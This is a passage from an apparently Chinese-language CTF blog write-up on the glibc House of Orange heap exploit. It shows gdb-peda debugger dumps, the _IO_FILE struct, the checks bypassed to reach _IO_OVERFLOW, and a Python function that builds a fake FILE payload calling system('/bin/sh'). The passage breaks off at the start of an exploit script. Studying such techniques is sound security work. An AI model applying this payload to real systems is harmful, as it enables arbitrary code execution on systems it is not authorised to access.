class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x7fffffffe59f --&gt; 0xa00 (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">RBX: 0x2aaaab097b20 --&gt; 0x100000001</span><br><span class="line">RCX: 0x7c (<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">RDX: 0x2aaaab097b28 --&gt; 0x0</span><br><span class="line">RSI: 0x60 (<span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">RDI: 0x7fffffffe5a0 --&gt; 0xa (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">RBP: 0x20 (<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">RSP: 0x7fffffffe520 --&gt; 0x2</span><br><span class="line">RIP: 0x2aaaaad54e10 (&lt;_int_malloc+656&gt;:mov    QWORD PTR [r15+0x10],r12)</span><br><span class="line">R8 : 0x0</span><br><span class="line">R9 : 0x1999999999999999</span><br><span class="line">R10: 0x0</span><br><span class="line">R11: 0x2aaaaae4a5e0 --&gt; 0x2000200020002</span><br><span class="line">R12: 0x2aaaab097b78 --&gt; 0x55555577a010 --&gt; 0x0</span><br><span class="line">R13: 0x555555758570 --&gt; 0x68732f6e69622f (<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">R14: 0x2710</span><br><span class="line">R15: 0x2aaaab098510 --&gt; 0x0</span><br><span class="line">EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x2aaaaad54e03 &lt;_int_malloc+643&gt;:je     0x2aaaaad54fa0 &lt;_int_malloc+1056&gt;</span><br><span class="line">   0x2aaaaad54e09 &lt;_int_malloc+649&gt;:cmp    rbp,rsi</span><br><span class="line">   0x2aaaaad54e0c &lt;_int_malloc+652&gt;:mov    QWORD PTR [rbx+0x70],r15</span><br><span class="line">=&gt; 0x2aaaaad54e10 &lt;_int_malloc+656&gt;:mov    QWORD PTR [r15+0x10],r12</span><br><span class="line">   0x2aaaaad54e14 &lt;_int_malloc+660&gt;:je     0x2aaaaad552c8 &lt;_int_malloc+1864&gt;</span><br><span class="line">   0x2aaaaad54e1a &lt;_int_malloc+666&gt;:cmp    rsi,0x3ff</span><br><span class="line">   0x2aaaaad54e21 &lt;_int_malloc+673&gt;:jbe    0x2aaaaad54d80 &lt;_int_malloc+512&gt;</span><br><span class="line">   0x2aaaaad54e27 &lt;_int_malloc+679&gt;:mov    rax,rsi</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffe520 --&gt; 0x2</span><br><span class="line">0008| 0x7fffffffe528 --&gt; 0x10</span><br><span class="line">0016| 0x7fffffffe530 --&gt; 0x7fffffffe5a0 --&gt; 0xa (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">0024| 0x7fffffffe538 --&gt; 0x7fffffffe740 --&gt; 0x1</span><br><span class="line">0032| 0x7fffffffe540 --&gt; 0x0</span><br><span class="line">0040| 0x7fffffffe548 --&gt; 0x0</span><br><span class="line">0048| 0x7fffffffe550 --&gt; 0xffff800000001a61</span><br><span class="line">0056| 0x7fffffffe558 --&gt; 0x7fffffffe59f --&gt; 0xa00 (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">3516<span class="keyword">in</span> malloc.c</span><br><span class="line">1: _IO_list_all = (struct _IO_FILE_plus *) 0x2aaaab098540 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p>此时，<code>mov    QWORD PTR [r15+0x10],r12</code></p><p><code>R12: 0x2aaaab097b78 --&gt; 0x55555577a010 --&gt; 0x0</code> ,<code>R15: 0x2aaaab098510 --&gt; 0x0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_list_all</span><br><span class="line"><span class="variable">$11</span> = (struct _IO_FILE_plus *) 0x2aaaab097b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure><p> _IO_list_all 被 修改成 0x2aaaab097b78 addr 。</p><p>此时 _IO_list_all —&gt; main_arean 。另外一个问题来了，我们虽然控制了 _IO_list_all ,但是无法修改main_arean 的值。</p><p>我们注意到，此时 main_arean 被当做 file struct ，则应有如下结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span>  </span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags  </span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  <span class="keyword">int</span> _fileno;<span class="comment">//这个就是linux内核中文件描述符fd  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0  </span></span><br><span class="line">  <span class="keyword">int</span> _blksize;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">  <span class="keyword">int</span> _flags2;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span>  </span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;  </span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span>  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  _IO_FILE file;  </span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">//IO函数跳转表  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们注意到，这里 <code>struct _IO_FILE *_chain;  </code></p><p>_IO_File 是个文件结构体，<code>_chain</code> 指向了下一个结构体，如果我们能控制 chain 指向 heap buffer ，我们就能构造一个完整的file struct ，那么此刻要解决的问题就是如何控制 chain 指向 heap buufer 呢？</p><p>我们此刻知道， chain 在 file struct的offset 为0x68</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;((struct _IO_FILE*)0)-&gt;_chain</span><br><span class="line"><span class="variable">$13</span> = (struct _IO_FILE **) 0x68</span><br></pre></td></tr></table></figure><p>Unsortbin  位于bin[1] 后面的的62个bin 均为 smallbin</p><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p><table><thead><tr><th>下标</th><th>SIZE_SZ=4（32 位）</th><th>SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td>x</td><td>2<em>4</em>x</td><td>2<em>8</em>x</td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><p>此时 offset = 0x68 在 bin[4]</p><p><code>fp-&gt;_chain = fp+0x68 = unsorted_bin + 0x68</code></p><p><code>bins[2-6]</code>都是<code>smallbins</code>的范围，大小为0x20,0x30,0x40,0x50,0x60。所以为了让<code>fp</code>指向我们指定的位置，就需要让<code>bins[6]</code>即0x60的<code>smallbin</code>是我们控制的。<br>那么现在<code>unsorted bin</code>中存在唯一的<code>chunk</code>为<code>top</code>，我们将它的大小改为<code>0x61</code>（因为<code>unsorted bin</code>中必然是空闲的，所以其前一个必然在使用中），那么当其加入<code>smallbin</code>中就会加入到<code>bins[6]</code>，这样就能实现<code>fp=top</code>也就是我们控制的位置了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55555577a010 (size : 0x20ff0)</span><br><span class="line">       last_remainder: 0x555555758570 (size : 0x60)</span><br><span class="line">            unsortbin: 0x555555758570 (size : 0x60)</span><br><span class="line">(0x060)  smallbin[ 4]: 0x555555758570 (overlap chunk with 0x555555758570(freed) )</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>此时 </p><p>fp—&gt; chain—&gt; 0x555555758570</p><p>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fp <span class="number">0x2aaaab097b78</span></span><br><span class="line">$<span class="number">18</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x5577a010</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x555555758570</span> <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x555555758570</span> <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab098510</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x2aaaab097b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;p\205uUUU&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x2aaaab097b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;p\205uUUU&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x2aaaab097b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x2aaaab097b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x2aaaab097ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x2aaaab097ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x2aaaab097bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x2aaaab097bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x555555758570</span>,</span><br><span class="line">    _chain = <span class="number">0x555555758570</span>,</span><br><span class="line">    _fileno = <span class="number">0xab097bd8</span>,</span><br><span class="line">    _flags2 = <span class="number">0x2aaa</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaab097bd8</span>,</span><br><span class="line">    _cur_column = <span class="number">0x7be8</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x9</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\253&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x2aaaab097be8</span> &lt;main_arena+<span class="number">200</span>&gt;,</span><br><span class="line">    _offset = <span class="number">0x2aaaab097bf8</span>,</span><br><span class="line">    _codecvt = <span class="number">0x2aaaab097bf8</span> &lt;main_arena+<span class="number">216</span>&gt;,</span><br><span class="line">    _wide_data = <span class="number">0x2aaaab097c08</span> &lt;main_arena+<span class="number">232</span>&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x2aaaab097c08</span> &lt;main_arena+<span class="number">232</span>&gt;,</span><br><span class="line">    _freeres_buf = <span class="number">0x2aaaab097c18</span> &lt;main_arena+<span class="number">248</span>&gt;,</span><br><span class="line">    __pad5 = <span class="number">0x2aaaab097c18</span>,</span><br><span class="line">    _mode = <span class="number">0xab097c28</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\252*\000\000(|\t\253\252*\000\000\070|\t\253\252*\000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x2aaaab097c38</span> &lt;main_arena+<span class="number">280</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ fp <span class="number">0x555555758570</span></span><br><span class="line">$<span class="number">19</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x6e69622f</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0x0</span>,</span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaaad18390</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x0</span>,</span><br><span class="line">    _offset = <span class="number">0x0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x555555758600</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x2</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x3</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0xffffffff</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x5555557585d0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我们还需要一些条件的bypass</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)　　</span><br></pre></td></tr></table></figure><p>条件总结如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">或</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p>这里可以选择第一种构造条件简单的进行构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange</span>(<span class="params">head_addr, system_addr, io_list_all</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload + p64(<span class="number">97</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">16</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr) + p64(<span class="number">0</span></span><br><span class="line">        ) * <span class="number">4</span></span><br><span class="line">    payload = payload + p64(head_addr + <span class="number">18</span> * <span class="number">8</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0</span></span><br><span class="line">        ) + p64(<span class="number">18446744073709551615</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(head_addr + <span class="number">12</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>构造结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fp <span class="number">0x555555758570</span></span><br><span class="line">$<span class="number">20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x6e69622f</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0x0</span>,</span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaaad18390</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x0</span>,</span><br><span class="line">    _offset = <span class="number">0x0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x555555758600</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x2</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x3</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0xffffffff</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x5555557585d0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 